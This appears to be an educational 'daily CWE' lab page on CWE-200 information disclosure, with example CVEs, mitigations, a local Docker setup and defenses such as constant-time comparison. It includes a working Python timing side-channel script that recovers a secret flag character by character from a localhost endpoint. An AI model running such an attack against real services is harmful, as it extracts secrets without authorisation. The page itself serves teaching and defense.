---
categories:
  - daily_cwe
title: "CWE-200: Information Disclosure"
tags: 
  - CWE-2000
  - information disclosure
---
# EXPOSURE OF SENSITIVE INFORMATION TO AN UNAUTHORIZED ACTOR

## Descritpion

There are many different kinds of mistakes that introduce information exposures. The severity of the error can range widely, depending on the context in which the product opereates, the type of sensitive information that is revealed, and the benefits it may provide to an attacker. Some kinds of sensitive information include:

- private personal information
- system status and environment
- business secrets and intellectual property
- network status and configuration
- product's own code or internal state
- metadata
- indirect information

### Alternate terms

1. Information Disclosure
2. Information Leak

### Selected Observed Examples

| CVE | Note |
| :--- | :--- |
| **CVE-2022-31162** | Rust library leaks Oauth details in application debug logs |
| **CVE-2022-0708** | Collaboration platform does not clear team emails in a response, allowing leak of email addresses |
| **CVE-2021-25476** | Digital Rights Management (DRM) capability for mobile platform leaks pointer information, simplifying ASLR bypass |

### Potential Mitigations

**Separation of Privilege:** Comparmentalize the system to have "safe" areas where trust boundaries can be unambigously drawn. Do not allow sensitive data to go outside of the safe area. Ensure that appropriate compartamenlization is built into the system design, and the compartmentalization allows for and reinforces privilege separation functionality. Architects and designers should rely on the principle of least privilege to decide the appropriate time to use privileges and the time to drop privileges.

## Implementation

### Basic project structure
```
.
├── Dockerfile
├── requirements.txt
├── app.py
```

Dockerfile

```Dockerfile
--8<-- "docs/daily_cwe/cwe-200/source/Dockerfile"
```

requirements.txt

```txt
--8<-- "docs/daily_cwe/cwe-200/source/requirements.txt"
```

app.py

```python
--8<-- "docs/daily_cwe/cwe-200/source/app.py"
```

### Deploy

```docker
docker build -t info-dis-demo .
docker run -d -p 5000:5000 --name info-dis-lab info-dis-demo
```

### PoC

```python
import requests
import string
import time

URL = "http://localhost:5000/api/verify"
CHARSET = string.ascii_letters + string.digits + "{}_"
FLAG_LENGTH = 28

known_flag = ""

print("[+] Starting Side-Channel Timing Attack...")

for position in range(FLAG_LENGTH):
    best_char = ""
    max_time = 0.0

    for char in CHARSET:
        test_payload = known_flag + char + "A" * (FLAG_LENGTH - len(known_flag) - 1)
        
        start_time = time.time()
        res = requests.post(URL, json={"flag": test_payload})
        elapsed_time = time.time() - start_time

        if elapsed_time > max_time:
            max_time = elapsed_time
            best_char = char

    known_flag += best_char
    print(f"[+] Leaked position {position + 1}: {known_flag} (Time: {max_time:.4f}s)")

print(f"\n[*] Extracted Flag: {known_flag}")
```

### Defense

#### 1. Constant-Time Comparison

```python
import hmac
is_valid = hmac.compare_digest(user_input, SECRET_FLAG)
```

#### 2. Generic Error Messages

Return `Invalid credentials` instead of `User not found` or `Wrong password for user X`

#### 3. Filter Data Response

Always using DTO (Data Transfer Object) or Serializer to properly filter the field before sending back to client.